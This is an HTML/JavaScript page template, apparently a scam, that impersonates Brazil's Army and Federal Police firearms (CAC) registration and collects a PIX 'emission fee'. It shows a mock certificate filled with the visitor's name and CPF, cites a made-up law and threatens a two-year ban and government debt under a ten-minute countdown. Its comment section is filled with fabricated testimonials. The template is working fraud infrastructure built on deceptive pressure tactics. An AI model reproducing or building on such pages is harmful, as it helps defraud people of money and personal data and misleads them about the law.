{% extends "layout.html" %}

{% block content %}
<style>
    body {
        background-color: #fff !important;
    }
</style>
<main class="container mx-auto px-1 py-2 mt-4 max-w-none w-full" style="background-color: #fff;">
    <div class="mb-6">
        <p class="mb-3 text-base">Informamos que seu processo foi registrado com sucesso no Sistema Nacional de Armas (SINARM) da Polícia Federal. Para concluir a obtenção do Certificado de Registro CAC, <strong>é obrigatório o pagamento da Taxa de Emissão do CR no valor de R$ 64,80</strong>.</p>
    </div>

    <!-- Próximos Passos -->
    <div class="mb-6">
        <h2 class="text-base font-bold mb-4 text-gray-800">Próximos Passos</h2>
        
        <div class="space-y-4">
            <!-- Primeiro Tópico: Pagamento -->
            <div class="bg-blue-50 border-l-4 border-blue-400 p-4" style="border-radius: 2px;">
                <h3 class="font-semibold text-blue-800 mb-2 text-base">1. Pagar a Taxa de Emissão do CR</h3>
                <p class="text-base text-blue-700">
                    Taxa de R$ 64,80 estabelecida pelo Exército Brasileiro para custear procedimentos administrativos e emissão do certificado.
                </p>
            </div>

            <!-- Segundo Tópico: Exame de Tiro -->
            <div class="bg-green-50 border-l-4 border-green-400 p-4" style="border-radius: 2px;">
                <h3 class="font-semibold text-green-800 mb-2 text-base">2. Exame de Tiro</h3>
                <div class="text-base text-green-700 space-y-2">
                    <p><strong>Lei 14.876/2025:</strong> Não é mais obrigatório estar matriculado em clube de tiro, mas é necessário realizar teste prático de manuseio seguro.</p>
                    <p>Após o pagamento, você receberá uma Guia de Prova para apresentar em qualquer clube credenciado. O resultado é informado automaticamente ao Exército.</p>
                    <p>Certificado CAC oficial será entregue em sua residência em até 7 dias úteis após aprovação no teste.</p>
                </div>
            </div>
        </div>
    </div>

    <!-- Document Section -->
    <div class="flex justify-center mb-6 px-2 overflow-x-auto">
        <div class="cr-outer">
            <img 
                src="https://i.ibb.co/Mkfs9J4s/Design-sem-nome-3-1.png" 
                alt="Borda oficial de documento brasileiro, sem fundo, com detalhes dourados e arabescos, deitada na horizontal" 
                class="cr-border-img"
                draggable="false"
            >
            <div class="cr-content">
                <img alt="Brasão da República Federativa do Brasil, colorido, com estrela azul, folhas verdes, faixa amarela e azul, fundo transparente" class="cr-emblem" draggable="false" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT-d2hgBOBbojBokAIYajmOPio84hI2O_6M_Q&s" width="220" height="220">
                <div>
                    <div class="text-center">
                        <div style="font-size: 8px; font-weight: normal; line-height: 1.2; color: black; letter-spacing: 0.01em; margin-bottom: 0.5px; font-family: 'Roboto', Arial, sans-serif;">REPÚBLICA FEDERATIVA DO BRASIL</div>
                        <div style="font-size: 8px; font-weight: normal; line-height: 1.2; color: black; letter-spacing: 0.01em; margin-bottom: 0.5px; font-family: 'Roboto', Arial, sans-serif;">MINISTÉRIO DA DEFESA</div>
                        <div style="font-size: 8px; font-weight: normal; line-height: 1.2; color: black; letter-spacing: 0.01em; margin-bottom: 0.5px; font-family: 'Roboto', Arial, sans-serif;">EXÉRCITO BRASILEIRO</div>
                        <div class="mt-1 text-[14px] font-bold leading-tight text-black tracking-tight">CERTIFICADO DE REGISTRO</div>
                    </div>
                    <div class="flex justify-between mt-2" style="font-size: 8px; font-family: 'Roboto', Arial, sans-serif;">
                        <div class="flex items-center">
                            <span class="cr-label">Nº CR</span>
                            <span class="cr-value" id="cr-number" style="margin-left: 4px;">000.000.000-00</span>
                        </div>
                        <div class="flex items-center">
                            <span class="cr-label">VALIDADE</span>
                            <span class="cr-value" id="cr-validade" style="margin-left: 4px;">00/00/0000</span>
                        </div>
                    </div>
                    <div class="cr-field-group cr-nome" style="margin-top:6px;">
                        <span class="cr-label-float">NOME COMPLETO</span>
                        <div class="cr-field" style="background:transparent;">
                            <span class="cr-value uppercase font-bold" id="text-overlay-name">FULANO DE TAL</span>
                        </div>
                    </div>
                    <div class="cr-row" style="margin-top:6px;">
                        <div class="cr-field-group cr-cpf">
                            <span class="cr-label-float">CPF</span>
                            <div class="cr-field" style="background:transparent;">
                                <span class="cr-value font-bold" id="text-overlay-cpf">000.000.000-00</span>
                            </div>
                        </div>
                        <div class="cr-field-group cr-sfpc">
                            <span class="cr-label-float">SFPC DE VINCULAÇÃO (RM)</span>
                            <div class="cr-field" style="background:transparent;">
                                <span class="cr-value">Cmdo 2ª RM</span>
                            </div>
                        </div>
                    </div>
                    <div class="cr-field-group cr-amparo" style="margin-top:6px;">
                        <span class="cr-label-float">AMPARO LEGAL</span>
                        <div class="cr-field" style="background:transparent;">
                            <span class="cr-amp">De acordo com a Lei 10.826, de 22 Dez 2003 e Decreto 9.846, de 25 Jun 2019</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Aviso de Pagamento -->
    <div style="max-width: 800px; margin: 24px auto 0 auto; padding: 0 16px;">
        <div style="background-color: #fee2e2; border: 2px solid #fca5a5; padding: 24px; border-radius: 2px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
            <div style="text-align: center; margin-bottom: 16px;">
                <div style="margin-bottom: 12px;">
                    <i class="fas fa-exclamation-triangle" style="color: #ef4444; font-size: 24px;"></i>
                </div>
                <p style="font-size: 16px; color: #991b1b; font-weight: 500; margin: 0;">
                    <strong>ATENÇÃO:</strong> Para finalizar o Registro CAC é obrigatório o pagamento da Taxa de Emissão do CR no valor de <strong>R$ 64,80</strong>.
                </p>
            </div>
            <div style="text-align: center;">
                <button onclick="window.location.href='/pagamento'" style="background-color: #16a34a; color: white; font-weight: bold; padding: 12px 32px; border-radius: 2px; border: none; cursor: pointer; font-size: 16px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); transition: all 0.3s;" onmouseover="this.style.backgroundColor='#15803d'" onmouseout="this.style.backgroundColor='#16a34a'">
                    PAGAR TAXA DE EMISSÃO
                </button>
            </div>
        </div>
    </div>

    <!-- Seção de Comentários -->
    <div style="max-width: 2400px; margin: 48px 0 0 0; padding: 0 20px; background-color: #fff;">
        
        <div>
                <!-- Comentário 1 - Específico sobre teste de tiro -->
                <div style="background: white; padding: 20px; margin-bottom: 16px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.08); border: 1px solid #e5e7eb;">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background-color: #2D5A27; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px;">
                            <span style="color: white; font-weight: bold; font-size: 14px;">MS</span>
                        </div>
                        <div>
                            <strong style="font-size: 14px; color: #1f2937;">Marcos Silva</strong>
                            <div style="font-size: 12px; color: #6b7280;">há 3 dias</div>
                        </div>
                    </div>
                    <p style="font-size: 16px; color: #374151; line-height: 1.6; margin: 0 0 12px 0;">
                        Cara, foi super rapido! Depois que paguei a emissao fui num clube de tiro aqui perto de casa e fiz o teste de manuseio eo instrutor me ensinou sobre segurança e como manusear as armas direito. Em 40 minutos tava tudo pronto passei na hora! 5 dias depois chegou meu CR aqui em casa e eu consegui fazer o pedido de uma .380 no site da Tauros usando o CR. Processo muito mais facil do que eu imaginava, parabens exercito pela agilidade!
                    </p>
                    <div style="margin-bottom: 12px;">
                        <img src="https://www.shopgun.com.br/uploads/img/usuarios/374/anuncios/237/anuncios_fotos/35c530029e0bd125fa4bc2e375f4d674.png" alt="Pistola .380" style="max-width: 200px; height: auto; border-radius: 2px; border: 1px solid #e5e7eb;">
                    </div>
                    
                    <!-- Respostas -->
                    <div style="margin-top: 16px; padding-left: 20px; border-left: 2px solid #e5e7eb;">
                        <!-- Primeira resposta -->
                        <div style="margin-bottom: 12px;">
                            <div style="display: flex; align-items: center; margin-bottom: 6px;">
                                <div style="width: 24px; height: 24px; background-color: #6b7280; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 8px;">
                                    <span style="color: white; font-weight: bold; font-size: 10px;">RC</span>
                                </div>
                                <div>
                                    <strong style="font-size: 12px; color: #1f2937;">Ricardo Costa</strong>
                                    <span style="font-size: 10px; color: #6b7280; margin-left: 8px;">há 3 dias</span>
                                </div>
                            </div>
                            <p style="font-size: 14px; color: #374151; line-height: 1.5; margin: 0;">
                                @Marcos Silva cara, você fez o cadastro pelo site mesmo? Como foi que fez o teste?
                            </p>
                        </div>
                        
                        <div style="margin-bottom: 12px;">
                            <div style="display: flex; align-items: center; margin-bottom: 6px;">
                                <div style="width: 24px; height: 24px; background-color: #2D5A27; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 8px;">
                                    <span style="color: white; font-weight: bold; font-size: 10px;">MS</span>
                                </div>
                                <div>
                                    <strong style="font-size: 12px; color: #1f2937;">Marcos Silva</strong>
                                    <span style="font-size: 10px; color: #6b7280; margin-left: 8px;">há 3 dias</span>
                                </div>
                            </div>
                            <p style="font-size: 14px; color: #374151; line-height: 1.5; margin: 0;">
                                @Ricardo Costa Sim mano, fiz o cadastro aqui no site e foi num clube de tiro da minha cidade mesmo. Foi bem tranquilo.
                            </p>
                        </div>
                        
                        <div style="margin-bottom: 12px;">
                            <div style="display: flex; align-items: center; margin-bottom: 6px;">
                                <div style="width: 24px; height: 24px; background-color: #6b7280; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 8px;">
                                    <span style="color: white; font-weight: bold; font-size: 10px;">RC</span>
                                </div>
                                <div>
                                    <strong style="font-size: 12px; color: #1f2937;">Ricardo Costa</strong>
                                    <span style="font-size: 10px; color: #6b7280; margin-left: 8px;">há 3 dias</span>
                                </div>
                            </div>
                            <p style="font-size: 14px; color: #374151; line-height: 1.5; margin: 0;">
                                @Marcos Silva Pode fazer o exame em qualquer clube de tiro? Depois do exame você teve que fazer mais alguma coisa?
                            </p>
                        </div>
                        
                        <div>
                            <div style="display: flex; align-items: center; margin-bottom: 6px;">
                                <div style="width: 24px; height: 24px; background-color: #2D5A27; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 8px;">
                                    <span style="color: white; font-weight: bold; font-size: 10px;">MS</span>
                                </div>
                                <div>
                                    <strong style="font-size: 12px; color: #1f2937;">Marcos Silva</strong>
                                    <span style="font-size: 10px; color: #6b7280; margin-left: 8px;">há 3 dias</span>
                                </div>
                            </div>
                            <p style="font-size: 14px; color: #374151; line-height: 1.5; margin: 0;">
                                @Ricardo Costa Depois do pagamento o exército entrega um documento autorizando o teste. No documento tem todos os clubes de tiro com endereço e telefone próximos do seu endereço. Eu fui num desses clubes, fiz o teste e depois o próprio clube enviou a aprovação pro exército. Meu CR chegou na minha casa certinho!
                            </p>
                        </div>
                    </div>
                </div>

                <!-- Comentário 2 -->
                <div style="background: white; padding: 20px; margin-bottom: 16px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.08); border: 1px solid #e5e7eb;">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background-color: #2D5A27; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px;">
                            <span style="color: white; font-weight: bold; font-size: 14px;">JC</span>
                        </div>
                        <div>
                            <strong style="font-size: 14px; color: #1f2937;">João Carlos</strong>
                            <div style="font-size: 12px; color: #6b7280;">há 1 semana</div>
                        </div>
                    </div>
                    <p style="font-size: 16px; color: #374151; line-height: 1.6; margin: 0;">
                        Muito top rapidez na aprovação tambem, não demorou nem 1 semana pra chegar meu CAC
                    </p>
                </div>

                <!-- Comentário 3 - Mulher -->
                <div style="background: white; padding: 20px; margin-bottom: 16px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.08); border: 1px solid #e5e7eb;">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background-color: #2D5A27; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px;">
                            <span style="color: white; font-weight: bold; font-size: 14px;">AS</span>
                        </div>
                        <div>
                            <strong style="font-size: 14px; color: #1f2937;">Ana Santos</strong>
                            <div style="font-size: 12px; color: #6b7280;">há 4 dias</div>
                        </div>
                    </div>
                    <p style="font-size: 16px; color: #374151; line-height: 1.6; margin: 0;">
                        Meninas, super tranquilo viu! Fui n clube de tiro e consegui passar facilmente mesmo nunca tendo contato com arma antes! Essa semana vou procurar uma pistola para comprar!
                    </p>
                </div>

                <!-- Comentário 4 -->
                <div style="background: white; padding: 20px; margin-bottom: 16px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.08); border: 1px solid #e5e7eb;">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background-color: #2D5A27; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px;">
                            <span style="color: white; font-weight: bold; font-size: 14px;">RF</span>
                        </div>
                        <div>
                            <strong style="font-size: 14px; color: #1f2937;">Roberto Ferreira</strong>
                            <div style="font-size: 12px; color: #6b7280;">há 6 dias</div>
                        </div>
                    </div>
                    <p style="font-size: 16px; color: #374151; line-height: 1.6; margin: 0;">
                        Achei que ia ser burocracia, mas foi bem simples. Teste de tiro foi de boa, já tinha experiencia com armas. CAC chegou terça feira e ja comprei o revolver na Taurus.
                    </p>
                </div>

                <!-- Comentário 5 -->
                <div style="background: white; padding: 20px; margin-bottom: 16px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.08); border: 1px solid #e5e7eb;">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background-color: #2D5A27; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px;">
                            <span style="color: white; font-weight: bold; font-size: 14px;">LM</span>
                        </div>
                        <div>
                            <strong style="font-size: 14px; color: #1f2937;">Lucas Moraes</strong>
                            <div style="font-size: 12px; color: #6b7280;">há 2 semanas</div>
                        </div>
                    </div>
                    <p style="font-size: 16px; color: #374151; line-height: 1.6; margin: 0;">
                        Recomendo pra galera que quer fazer o CAC sem gastar uma fortuna. Agilidade e facilidade nota 10!
                    </p>
                </div>

                <!-- Comentário 6 -->
                <div style="background: white; padding: 20px; margin-bottom: 16px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.08); border: 1px solid #e5e7eb;">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background-color: #2D5A27; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px;">
                            <span style="color: white; font-weight: bold; font-size: 14px;">CA</span>
                        </div>
                        <div>
                            <strong style="font-size: 14px; color: #1f2937;">Carlos Alberto</strong>
                            <div style="font-size: 12px; color: #6b7280;">há 1 semana</div>
                        </div>
                    </div>
                    <p style="font-size: 16px; color: #374151; line-height: 1.6; margin: 0;">
                        Pessoal, consegui meu CAC aqui e foi moleza. Processo transparente e ja to com meu certificado em maos e to indo atras da minha primeira arma. Valeu muito a pena!
                    </p>
                </div>

                <!-- Comentário 7 -->
                <div style="background: white; padding: 20px; margin-bottom: 16px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.08); border: 1px solid #e5e7eb;">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background-color: #2D5A27; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px;">
                            <span style="color: white; font-weight: bold; font-size: 14px;">DL</span>
                        </div>
                        <div>
                            <strong style="font-size: 14px; color: #1f2937;">Diego Lima</strong>
                            <div style="font-size: 12px; color: #6b7280;">há 5 dias</div>
                        </div>
                    </div>
                    <p style="font-size: 16px; color: #374151; line-height: 1.6; margin: 0;">
                        Fiz tudo pelo celular mesmo, só o teste que tive que ir num clube aqui da cidade e foi bem de boa, o cara do clube explicou tudo direitinho. Top demais!
                    </p>
                </div>

                <!-- Comentário 8 -->
                <div style="background: white; padding: 20px; margin-bottom: 16px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.08); border: 1px solid #e5e7eb;">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background-color: #2D5A27; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px;">
                            <span style="color: white; font-weight: bold; font-size: 14px;">PS</span>
                        </div>
                        <div>
                            <strong style="font-size: 14px; color: #1f2937;">Paulo Souza</strong>
                            <div style="font-size: 12px; color: #6b7280;">há 3 dias</div>
                        </div>
                    </div>
                    <p style="font-size: 16px; color: #374151; line-height: 1.6; margin: 0;">
                        Ate que enfim essa anta que governa o país fez algo que presta pro cidadao de bem. Documento chegou hoje cedo. Queria parabenizar o nosso Exercito Brasileiro!!!
                    </p>
                </div>

                <!-- Comentário 9 -->
                <div style="background: white; padding: 20px; margin-bottom: 16px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.08); border: 1px solid #e5e7eb;">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background-color: #2D5A27; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px;">
                            <span style="color: white; font-weight: bold; font-size: 14px;">TA</span>
                        </div>
                        <div>
                            <strong style="font-size: 14px; color: #1f2937;">Thiago Alves</strong>
                            <div style="font-size: 12px; color: #6b7280;">há 1 semana</div>
                        </div>
                    </div>
                    <p style="font-size: 16px; color: #374151; line-height: 1.6; margin: 0;">
                        Fiz meu CAC aqui e nao tive nenhum problema nota 1000
                    </p>
                </div>

                <!-- Comentário 10 -->
                <div style="background: white; padding: 20px; margin-bottom: 16px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.08); border: 1px solid #e5e7eb;">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background-color: #2D5A27; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px;">
                            <span style="color: white; font-weight: bold; font-size: 14px;">GS</span>
                        </div>
                        <div>
                            <strong style="font-size: 14px; color: #1f2937;">Gustavo Santos</strong>
                            <div style="font-size: 12px; color: #6b7280;">há 4 dias</div>
                        </div>
                    </div>
                    <p style="font-size: 16px; color: #374151; line-height: 1.6; margin: 0;">
                        Processso bem mais facil que eu esperava. Fiz o teste no clube aqui da cidade e foi suave. O bom é que da pra comprar a arma pela internet parcelado ainda
                    </p>
                </div>

                <!-- Comentário 11 - Mulher -->
                <div style="background: white; padding: 20px; margin-bottom: 16px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.08); border: 1px solid #e5e7eb;">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background-color: #2D5A27; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px;">
                            <span style="color: white; font-weight: bold; font-size: 14px;">MR</span>
                        </div>
                        <div>
                            <strong style="font-size: 14px; color: #1f2937;">Maria Rosa</strong>
                            <div style="font-size: 12px; color: #6b7280;">há 6 dias</div>
                        </div>
                    </div>
                    <p style="font-size: 16px; color: #374151; line-height: 1.6; margin: 0;">
                        Fiz meu CAC aqui e foi tudo bem explicadinho. Como mulher, eu tinha um pouco de receio, mas o pessoal do clube foi super atencioso no teste de tiro. Processo rapido e barato. Agora me sinto mais protegida!
                    </p>
                </div>

                <!-- Comentário 12 -->
                <div style="background: white; padding: 20px; margin-bottom: 16px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.08); border: 1px solid #e5e7eb;">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background-color: #2D5A27; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px;">
                            <span style="color: white; font-weight: bold; font-size: 14px;">AL</span>
                        </div>
                        <div>
                            <strong style="font-size: 14px; color: #1f2937;">Antonio Lima</strong>
                            <div style="font-size: 12px; color: #6b7280;">há 2 dias</div>
                        </div>
                    </div>
                    <p style="font-size: 16px; color: #374151; line-height: 1.6; margin: 0;">
                        Cara, que site bom! Fiz meu CAC aqui semana passada e já to com o documento em mãos
                    </p>
                </div>
            </div>
    </div>
</main>

<!-- Adiciona o popup de pagamento -->
<div id="paymentPopup" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 px-4" style="display: none;">
    <div class="bg-white w-[98%] max-w-2xl rounded-md shadow-2xl overflow-hidden" style="border-radius: 2px;">
        <!-- Initial content -->
        <div id="initialContent">
            <div class="p-4">
                <div class="text-left text-sm mb-4">
                    <ul class="list-disc pl-5 space-y-1">
                        <li>
                            Efetue o pagamento da Taxa de Inscrição em até
                            <span class="font-bold text-red-600" id="countdown">10:00</span>.
                        </li>
                        <li>
                            Após, marque o exame de tiro na base militar.
                        </li>
                    </ul>
                </div>
                <div class="bg-green-50 bg-opacity-70 p-3 mb-4 text-sm text-green-800" style="border-radius: 2px;">
                    <p class="font-semibold mb-1">
                        <i class="fas fa-info-circle mr-1"></i>
                        Base Militar Localizada:
                    </p>
                    <p>
                        Uma base militar para realizar o teste de tiro foi localizada a
                        <span class="font-bold">12,4 km</span>
                        de distância.
                    </p>
                    <p class="mt-1">
                        Após o exame de tiro, seu CAC será liberado em até
                        <span class="font-bold">48 horas</span>
                        para compras de armamento.
                    </p>
                </div>
                <div class="bg-yellow-50 border-l-4 border-yellow-400 p-3 mb-4 text-sm" style="border-radius: 2px;">
                    <p class="font-semibold mb-1">
                        <i class="fas fa-exclamation-triangle text-yellow-600 mr-1"></i>
                        Aviso Importante:
                    </p>
                    <p>
                        Caso o pagamento não seja efetuado dentro do prazo estipulado:
                    </p>
                    <ul class="list-disc pl-4 mt-1">
                        <li>
                            O requerente ficará impedido de se inscrever no Registro de novos CAC's pelo período de 2 (dois) anos.
                        </li>
                        <li>
                            O valor da Taxa de Inscrição será automaticamente inscrito na Dívida Ativa da União, vinculada ao CPF do requerente.
                        </li>
                        <li>
                            Poderão incidir juros e multas sobre o valor devido, conforme legislação vigente.
                        </li>
                    </ul>
                </div>
                <div class="text-center">
                    <button onclick="generatePixPayment()" class="btn-military btn-military-large w-full sm:w-auto">
                        <i class="fas fa-credit-card mr-2"></i>
                        PAGAR TAXA DE INSCRIÇÃO
                    </button>
                </div>
            </div>
        </div>

        <!-- Loading content -->
        <div id="loadingContent" class="p-8 text-center" style="display: none;">
            <div class="animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-military-green mx-auto mb-4"></div>
            <p class="text-lg font-semibold text-gray-700">Gerando Guia de Pagamento...</p>
        </div>

        <!-- Payment content -->
        <div id="paymentContent" class="p-6" style="display: none;">
            <div class="text-center mb-6">
                <p class="text-gray-600">Valor: <span class="font-bold text-green-600" id="paymentAmount">R$ 68,40</span></p>
                <p class="text-sm text-gray-500 mt-1">
                    Efetue o pagamento em até: <span class="font-bold text-red-600" id="paymentCountdown">10:00</span>
                </p>
            </div>

            <div class="bg-gray-50 rounded-lg p-4 mb-6 max-w-md mx-auto">
                <h4 class="font-medium text-gray-700 mb-2">Dados do devedor:</h4>
                <p class="text-sm">Nome: <span class="font-bold" id="devedorNome"></span></p>
                <p class="text-sm">CPF: <span class="font-bold" id="devedorCpf"></span></p>
            </div>

            <div class="flex flex-col items-center justify-center space-y-6">
                <!-- QR Code -->
                <div class="bg-white p-4 rounded-lg shadow-inner">
                    <img id="pixQrCode" src="" alt="QR Code PIX" style="width: 180px; height: 180px; object-fit: contain;">
                </div>

                <!-- Pix Copy and Paste -->
                <div class="w-full max-w-md">
                    <p class="text-sm text-gray-600 mb-2">Código PIX copia e cola:</p>
                    <div class="relative mb-2">
                        <input type="text" id="pixCode" readonly
                            class="w-full px-4 py-3 text-sm bg-gray-50 border border-gray-300 rounded-md focus:outline-none">
                    </div>
                    <button onclick="copyPixCode()" class="btn-military w-full">
                        <span id="copyButtonText">Copiar código</span>
                        <i id="copyIcon" class="fas fa-copy ml-2"></i>
                    </button>

                    <!-- Disclaimer -->
                    <div class="mt-4 bg-yellow-50 border-l-4 border-yellow-400 p-3 text-sm text-yellow-800">
                        <i class="fas fa-info-circle mr-1"></i>
                        Retorne a esta tela após efetuar o pagamento para agendar seu exame de tiro prático.
                    </div>
                </div>
            </div>
        </div>

        <div class="bg-gray-100 px-4 py-2 flex items-center justify-between text-xs">
            <div class="flex items-center">
                <div class="ml-2 border-l border-gray-300 pl-2">
                    <p class="text-gray-500">
                        SISG - Ministério da Defesa
                    </p>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        // Número de CR fixo
        function generateCRNumber() {
            return '678923/2025 - 2ª RM';
        }

        // Gerar data de validade (hoje + 10 anos)
        function generateValidityDate() {
            const today = new Date();
            const validityDate = new Date(today.getFullYear() + 10, today.getMonth(), today.getDate());
            const day = validityDate.getDate().toString().padStart(2, '0');
            const month = (validityDate.getMonth() + 1).toString().padStart(2, '0');
            const year = validityDate.getFullYear().toString().substr(-2);
            return `${day}/${month}/${year}`;
        }

        // Atualizar CR e validade
        document.getElementById('cr-number').textContent = generateCRNumber();
        document.getElementById('cr-validade').textContent = generateValidityDate();

        fetch('/get_user_data')
            .then(response => response.json())
            .then(data => {
                document.getElementById('text-overlay-name').textContent = (data.full_name || '').toUpperCase();
                document.getElementById('text-overlay-cpf').textContent = (data.cpf || '').toUpperCase();
            })
            .catch(error => console.error('Error:', error));
        const payButton = document.querySelector('.animate-left-right');
        const paymentPopup = document.getElementById('paymentPopup');

        function openPaymentPopup() {
            paymentPopup.style.display = 'flex';
            startCountdown();
        }

        if (payButton) {
            payButton.addEventListener('click', openPaymentPopup);
        }
    });

    function startCountdown() {
        let minutes = 10;
        let seconds = 0;
        const countdownEl = document.getElementById('countdown');
        const interval = setInterval(() => {
            if (seconds === 0) {
                if (minutes === 0) {
                    clearInterval(interval);
                    countdownEl.classList.add('text-red-800');
                    return;
                }
                minutes--;
                seconds = 59;
            } else {
                seconds--;
            }
            const formattedMinutes = minutes < 10 ? `0${minutes}` : minutes;
            const formattedSeconds = seconds < 10 ? `0${seconds}` : seconds;
            countdownEl.textContent = `${formattedMinutes}:${formattedSeconds}`;
            if (minutes === 0 && seconds <= 30) {
                countdownEl.classList.add('animate-pulse');
            }
        }, 1000);
    }

    function generatePixPayment() {
        const initialContent = document.getElementById('initialContent');
        const loadingContent = document.getElementById('loadingContent');
        const paymentContent = document.getElementById('paymentContent');

        // Show loading
        initialContent.style.display = 'none';
        loadingContent.style.display = 'block';
        paymentContent.style.display = 'none';

        // Call API to generate PIX payment
        fetch('/create_pix_payment', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            }
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                const paymentData = data.payment_data;

                // Update payment content
                document.getElementById('pixQrCode').src = paymentData.qrCodeBase64;
                document.getElementById('pixCode').value = paymentData.pixCode;

                // Start checking payment status
                const transactionId = paymentData.id;
                const statusCheckInterval = setInterval(() => {
                    checkPaymentStatus(transactionId);
                }, 5000); // Check every 5 seconds

                // Stop checking after 10 minutes
                setTimeout(() => {
                    clearInterval(statusCheckInterval);
                }, 600000);

                // Fill user data and show payment content
                fetch('/get_user_data')
                    .then(response => response.json())
                    .then(userData => {
                        document.getElementById('devedorNome').textContent = userData.full_name;
                        document.getElementById('devedorCpf').textContent = userData.cpf;
                    });

                // Show payment content
                loadingContent.style.display = 'none';
                paymentContent.style.display = 'block';

                // Start countdown
                startPaymentCountdown();
            } else {
                alert('Erro ao gerar pagamento: ' + data.error);
                initialContent.style.display = 'block';
                loadingContent.style.display = 'none';
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Erro ao gerar pagamento. Tente novamente.');
            initialContent.style.display = 'block';
            loadingContent.style.display = 'none';
        });
    }

    function checkPaymentStatus(transactionId) {
        // Check if we're in development environment (replit.dev)
        const isDevelopment = window.location.hostname.includes('replit.dev');

        if (isDevelopment) {
            // In development, simulate payment completion after 5 seconds
            setTimeout(() => {
                window.location.href = `/resultado/PAID`;
            }, 5000);
            return;
        }

        // In production, check actual payment status
        fetch(`/check_payment_status/${transactionId}`)
            .then(response => response.json())
            .then(data => {
                if (data.success && data.redirect) {
                    window.location.href = `/resultado/${data.status}`;
                }
            })
            .catch(error => console.error('Error:', error));
    }

    function copyPixCode() {
        const pixCode = document.getElementById('pixCode');
        const copyButtonText = document.getElementById('copyButtonText');
        const copyIcon = document.getElementById('copyIcon');

        pixCode.select();
        document.execCommand('copy');

        // Visual feedback
        copyButtonText.textContent = 'Código copiado';
        copyIcon.className = 'fas fa-check ml-2';

        setTimeout(() => {
            copyButtonText.textContent = 'Copiar código';
            copyIcon.className = 'fas fa-copy ml-2';
        }, 2000);
    }

    function startPaymentCountdown() {
        let minutes = 10;
        let seconds = 0;
        const countdownEl = document.getElementById('paymentCountdown');
        const interval = setInterval(() => {
            if (seconds === 0) {
                if (minutes === 0) {
                    clearInterval(interval);
                    countdownEl.classList.add('text-red-800');
                    return;
                }
                minutes--;
                seconds = 59;
            } else {
                seconds--;
            }
            const formattedMinutes = minutes < 10 ? `0${minutes}` : minutes;
            const formattedSeconds = seconds < 10 ? `0${seconds}` : seconds;
            countdownEl.textContent = `${formattedMinutes}:${formattedSeconds}`;
            if (minutes === 0 && seconds <= 30) {
                countdownEl.classList.add('animate-pulse');
            }
        }, 1000);
    }
</script>

<style>
        body { font-family: 'Roboto', Arial, sans-serif; }
        .cr-outer {
            position: relative;
            width: 100%;
            max-width: 900px;
            height: 650px;
            min-width: 400px;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: visible;
            background: transparent;
            margin: 0 auto;
            padding: 0;
        }
        .cr-border-img {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 95%;
            height: 95%;
            object-fit: contain;
            object-position: center;
            z-index: 1;
            pointer-events: none;
            user-select: none;
            transform: translate(-50%, -50%) rotate(90deg);
            background: transparent;
            display: block;
        }
        .cr-content {
            position: relative;
            z-index: 10;
            width: 75%;
            height: 75%;
